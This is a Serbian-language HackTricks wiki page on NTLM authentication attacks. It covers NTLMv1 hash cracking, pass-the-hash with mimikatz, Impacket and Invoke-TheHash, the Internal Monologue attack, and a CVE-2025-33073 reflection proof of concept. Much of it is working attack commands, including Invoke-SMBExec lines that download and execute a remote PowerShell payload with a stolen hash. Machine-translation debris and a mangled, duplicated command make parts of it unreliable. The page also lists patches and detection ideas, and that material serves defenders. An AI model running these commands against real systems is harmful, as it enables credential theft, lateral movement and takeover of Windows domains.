# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije

U okruženjima u kojima su aktivni **Windows XP i Server 2003**, koriste se LM (Lan Manager) hash-evi, iako je opštepoznato da se oni mogu lako kompromitovati. Određeni LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, ukazuje na scenario u kojem se LM ne koristi, odnosno predstavlja hash praznog stringa.

Podrazumevano se kao primarni metod koristi protokol za autentifikaciju **Kerberos**. NTLM (NT LAN Manager) stupa na scenu u određenim okolnostima: kada Active Directory ne postoji, kada domen ne postoji, kada Kerberos ne funkcioniše zbog nepravilne konfiguracije ili kada se konekcije pokušavaju uspostaviti korišćenjem IP adrese umesto važećeg hostname-a.

Prisustvo zaglavlja **"NTLMSSP"** u mrežnim paketima označava NTLM proces autentifikacije.

Podršku za protokole autentifikacije - LM, NTLMv1 i NTLMv2 - omogućava određeni DLL koji se nalazi na lokaciji `%windir%\Windows\System32\msv1\_0.dll`.

**Ključne tačke**:

- LM hash-evi su ranjivi, a prazan LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) označava da se LM ne koristi.
- Kerberos je podrazumevani metod autentifikacije, dok se NTLM koristi samo pod određenim uslovima.
- NTLM authentication paketi mogu se prepoznati po zaglavlju "NTLMSSP".
- LM, NTLMv1 i NTLMv2 protokole podržava sistemska datoteka `msv1\_0.dll`.

## LM, NTLMv1 i NTLMv2

Možete proveriti i konfigurisati koji protokol će se koristiti:

### GUI

Pokrenite _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Postoji 6 nivoa (od 0 do 5).

![LM, NTLMv1 i NTLMv2 - GUI: Pokrenite secpol.msc - Local policies - Security Options - Network Security: LAN Manager authentication level. Postoji 6 nivoa (od 0 do 5)](<../../images/image (919).png>)

### Registry

Ovim ćete postaviti nivo 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Moguće vrednosti:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Osnovna šema NTLM autentifikacije domena

1. **Korisnik** unosi svoje **akreditive**
2. Klijentska mašina **šalje zahtev za autentifikaciju**, šaljući **ime domena** i **korisničko ime**
3. **Server** šalje **izazov**
4. **Klijent šifruje** **izazov** koristeći hash lozinke kao ključ i šalje ga kao odgovor
5. **Server šalje** **Domain controlleru** **ime domena, korisničko ime, izazov i odgovor**. Ako **Active Directory nije konfigurisan** ili je ime domena ime servera, akreditive **proverava lokalno**.
6. **Domain controller proverava da li je sve ispravno** i šalje informacije serveru

**Server** i **Domain Controller** mogu da kreiraju **Secure Channel** putem **Netlogon** servera, jer Domain Controller zna lozinku servera (ona se nalazi u bazi **NTDS.DIT**).

### Lokalna šema NTLM autentifikacije

Autentifikacija je kao što je **pre** pomenuto, ali **server** zna **hash korisnika** koji pokušava da se autentifikuje, a koji se nalazi u fajlu **SAM**. Dakle, umesto da pita Domain Controller, **server će sam proveriti** da li korisnik može da se autentifikuje.

### NTLMv1 izazov

**Dužina izazova je 8 bajtova**, a **odgovor** je dug 24 bajta.

**NT hash (16 bajtova)** se deli na **3 dela od po 7 bajtova** (7B + 7B + (2B+0x00\*5)): **poslednji deo se popunjava nulama**. Zatim se **izazov** šifruje odvojeno svakim delom, a **dobijeni** šifrovani bajtovi se **spajaju**. Ukupno: 8B + 8B + 8B = 24 bajta.

**Problemi**:

- Nedostatak **nasumičnosti**
- 3 dela mogu biti **napadnuta zasebno** kako bi se pronašao NT hash
- **DES može da se razbije**
- Treći ključ se uvek sastoji od **5 nula**.
- Ako je **izazov isti**, **odgovor** će biti **isti**. Zato žrtvi možete zadati string "**1122334455667788**" kao **izazov** i napasti odgovor korišćenjem **unapred izračunatih rainbow tabela**.

### NTLMv1 napad

Danas je sve ređe pronaći okruženja sa konfigurisanom Unconstrained Delegation, ali to ne znači da ne možete **zloupotrebiti Print Spooler servis** koji je konfigurisan.

Možete zloupotrebiti neke akreditive/sesije koje već imate na AD-u kako biste **zatražili od štampača da se autentifikuje** prema nekom **hostu pod vašom kontrolom**. Zatim, koristeći `metasploit auxiliary/server/capture/smb` ili `responder`, možete **podesiti izazov autentifikacije na 1122334455667788**, uhvatiti pokušaj autentifikacije i, ako je korišćen **NTLMv1**, moći ćete da ga **razbijete**.\
Ako koristite `responder`, možete pokušati da **upotrebite zastavicu `--lm`** kako biste pokušali da **spustite** nivo **autentifikacije**.\
_Napomena: za ovu tehniku autentifikacija mora da se izvrši korišćenjem NTLMv1 (NTLMv2 nije validan)._

Imajte na umu da će štampač tokom autentifikacije koristiti nalog računara, a nalozi računara koriste **duge i nasumične lozinke** koje **verovatno nećete moći da razbijete** korišćenjem uobičajenih **rečnika**. Međutim, **NTLMv1** autentifikacija **koristi DES** ([više informacija ovde](#ntlmv1-challenge)), pa ćete korišćenjem nekih servisa posebno namenjenih za razbijanje DES-a moći da ga razbijete (na primer, možete koristiti [https://crack.sh/](https://crack.sh) ili [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 napad pomoću hashcat-a

NTLMv1 se takođe može razbiti pomoću NTLMv1 Multi Tool-a [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), koji formatira NTLMv1 poruke na način koji može da se razbije pomoću hashcat-a.<sup>[[1]](#references)</sup>

Komanda
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Pošaljite tekst koji treba prevesti.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Molimo navedite sadržaj datoteke.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Pokrenite hashcat (distribuirano je najbolje koristiti alat kao što je hashtopolis), jer će u suprotnom trajati nekoliko dana.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
U ovom slučaju znamo da je lozinka za ovo „password“, pa ćemo za potrebe demonstracije varati:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Sada treba da koristimo hashcat-utilities da konvertujemo razbijene DES ključeve u delove NTLM hash-a:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Konačno, poslednji deo:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Pošaljite tekstove koje treba spojiti.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Dužina challenge-a je 8 bajtova** i **šalju se 2 response-a**: Jedan je dužine **24 bajta**, a dužina **drugog** je **promenljiva**.

**Prvi response** se kreira šifrovanjem pomoću **HMAC_MD5** **string-a** sastavljenog od **client-a i domain-a**, pri čemu se kao **key** koristi **hash MD4** od **NT hash-a**. Zatim se **rezultat** koristi kao **key** za šifrovanje **challenge-a** pomoću **HMAC_MD5**. Ovome se dodaje **client challenge** od 8 bajtova. Ukupno: 24 B.

**Drugi response** se kreira korišćenjem **nekoliko vrednosti** (novi client challenge, **timestamp** za sprečavanje **replay attacks**...)

Ako imate **pcap u kojem je snimljen uspešan proces autentifikacije**, možete pratiti ovo uputstvo da biste dobili domain, username, challenge i response i pokušali da crack-ujete password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Kada imate hash žrtve**, možete ga koristiti za **impersonate** žrtvu.\
Potrebno je da koristite **tool** koji će **obaviti** **NTLM autentifikaciju koristeći** taj **hash**, **ili** možete kreirati novi **sessionlogon** i **inject-ovati** taj **hash** unutar **LSASS-a**, tako da se, kada se obavi bilo kakva **NTLM autentifikacija**, koristi **taj hash**. To je ono što radi mimikatz.

**Imajte na umu da Pass-the-Hash attacks možete obavljati i koristeći Computer accounts.**

### **Mimikatz**

**Mora se pokrenuti kao administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Ovo će pokrenuti proces koji će pripadati korisniku koji je pokrenuo mimikatz, ali će interno u LSASS-u sačuvani akreditivi biti oni koji se nalaze u parametrima mimikatz-a. Zatim možete pristupiti mrežnim resursima kao taj korisnik (slično triku `runas /netonly`, ali ne morate znati lozinku u čistom tekstu).

### Pass-the-Hash from linux

Možete dobiti izvršavanje koda na Windows mašinama koristeći Pass-the-Hash iz Linux-a.\
[**Ovde saznajte kako to da uradite.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Ovde možete preuzeti [impacket binaries for Windows](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (U ovom slučaju morate navesti komandu; cmd.exe i powershell.exe nisu validni za dobijanje interaktivnog shell-a)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Postoji još nekoliko Impacket binaries...

### Invoke-TheHash

PowerShell skripte možete preuzeti ovde: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ova funkcija je **kombinacija svih ostalih**. Možete proslediti **više hostova**, **isključiti** neke i **izabrati** **opciju** koju želite da koristite (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ako izaberete bilo koji od **SMBExec** i **WMIExec**, ali ne navedete parametar _**Command**_, funkcija će samo **proveriti** da li imate **dovoljno dozvola**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Mora da se pokrene kao administrator**

Ovaj alat radi isto što i mimikatz (menja memoriju LSASS-a).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ručno daljinsko izvršavanje u Windows-u sa korisničkim imenom i lozinkom


{{#ref}}
../lateral-movement/
{{#endref}}

## Izdvajanje kredencijala sa Windows hosta

**Za više informacija o tome** [**kako doći do kredencijala sa Windows hosta, pročitajte ovu stranicu**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack je prikrivena tehnika izdvajanja kredencijala koja napadaču omogućava da preuzme NTLM hash-eve sa mašine žrtve **bez direktne interakcije sa LSASS procesom**. Za razliku od Mimikatz-a, koji direktno čita hash-eve iz memorije i koji endpoint security rešenja ili Credential Guard često blokiraju, ovaj napad koristi **lokalne pozive NTLM authentication package-u (MSV1_0) preko Security Support Provider Interface-a (SSPI)**. Napadač najpre **snižava NTLM postavke** (npr. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) kako bi osigurao da je NetNTLMv1 dozvoljen. Zatim se predstavlja kao postojeći korisnički token dobijen iz pokrenutih procesa i lokalno pokreće NTLM autentifikaciju da bi generisao NetNTLMv1 odgovore koristeći poznati izazov.<sup>[[4]](#references)</sup>

Nakon hvatanja ovih NetNTLMv1 odgovora, napadač može brzo da povrati originalne NTLM hash-eve pomoću **unapred izračunatih rainbow tables**, što omogućava dalje Pass-the-Hash napade za lateral movement. Ključno je to što Internal Monologue Attack ostaje prikriven jer ne generiše mrežni saobraćaj, ne ubacuje kod i ne pokreće direktne dump-ove memorije, zbog čega ga je braniocima teže otkriti u poređenju sa tradicionalnim metodama kao što je Mimikatz.

Ako NetNTLMv1 nije prihvaćen — zbog nametnutih security policies — napadač možda neće uspeti da preuzme NetNTLMv1 odgovor.

Da bi se obradio ovaj slučaj, Internal Monologue tool je ažuriran: on dinamički pribavlja server token koristeći `AcceptSecurityContext()` kako bi i dalje **hvatao NetNTLMv2 odgovore** ako NetNTLMv1 ne uspe. Iako je NetNTLMv2 mnogo teže crack-ovati, on i dalje otvara mogućnost za relay attacks ili offline brute-force u ograničenim slučajevima.

PoC se može pronaći na **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay i Responder

**Detaljniji vodič o tome kako izvesti ove napade pročitajte ovde:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parsiranje NTLM izazova iz mrežnog capture-a

**Možete koristiti** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM i Kerberos *Reflection* preko Serialized SPN-ova (CVE-2025-33073)

Windows sadrži nekoliko mitigacija koje pokušavaju da spreče *reflection* napade, pri kojima se NTLM (ili Kerberos) autentifikacija koja potiče sa hosta prosleđuje nazad na **isti** host radi dobijanja SYSTEM privilegija.

Microsoft je prekinuo većinu javno poznatih lanaca pomoću MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) i kasnijih zakrpa, međutim **CVE-2025-33073** pokazuje da se zaštite i dalje mogu zaobići zloupotrebom načina na koji **SMB client skraćuje Service Principal Names (SPN-ove)** koji sadrže *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR greške
1. Napadač registruje **DNS A-record** čija labela kodira marshalled SPN – npr.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Žrtva se primorava da se autentifikuje na tom hostname-u (PetitPotam, DFSCoerce itd.).
3. Kada SMB client prosledi ciljni string `cifs/srv11UWhRCAAAAA…` funkciji `lsasrv!LsapCheckMarshalledTargetInfo`, poziv funkcije `CredUnmarshalTargetInfo` **uklanja** serialized blob, ostavljajući **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (ili ekvivalent za Kerberos) sada smatra da je cilj *localhost*, jer se skraćeni deo hosta podudara sa imenom računara (`SRV1`).
5. Zbog toga server postavlja `NTLMSSP_NEGOTIATE_LOCAL_CALL` i ubacuje **LSASS SYSTEM access-token** u kontekst (za Kerberos se kreira subsession key označen kao SYSTEM).
6. Relay-ovanje te autentifikacije pomoću `ntlmrelayx.py` **ili** `krbrelayx.py` daje puna SYSTEM prava na istom hostu.<sup>[[5]](#references)</sup>

### Brzi PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Zakrpe i ublažavanja
* KB zakrpa za **CVE-2025-33073** dodaje proveru u `mrxsmb.sys::SmbCeCreateSrvCall` koja blokira svaku SMB vezu čija meta sadrži marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Nametnite **SMB signing** da biste sprečili reflection čak i na nezakrpljenim hostovima.
* Nadgledajte DNS zapise koji liče na `*<base64>...*` i blokirajte coercion vektore (PetitPotam, DFSCoerce, AuthIP...).

### Ideje za detekciju
* Mrežni capture-i sa `NTLMSSP_NEGOTIATE_LOCAL_CALL` kod kojih se IP adresa klijenta razlikuje od IP adrese servera.
* Kerberos AP-REQ koji sadrži subsession key i client principal jednak nazivu hosta.
* Windows događaji 4624/4648 za SYSTEM logon, neposredno praćeni udaljenim SMB upisima sa istog hosta.<sup>[[5]](#references)</sup>

Za **March 2026** varijantu local reflection napada koja zloupotrebljava **SMB arbitrary ports** i **TCP connection reuse** kako bi došla do `NT AUTHORITY\SYSTEM`, pogledajte:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Reference
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
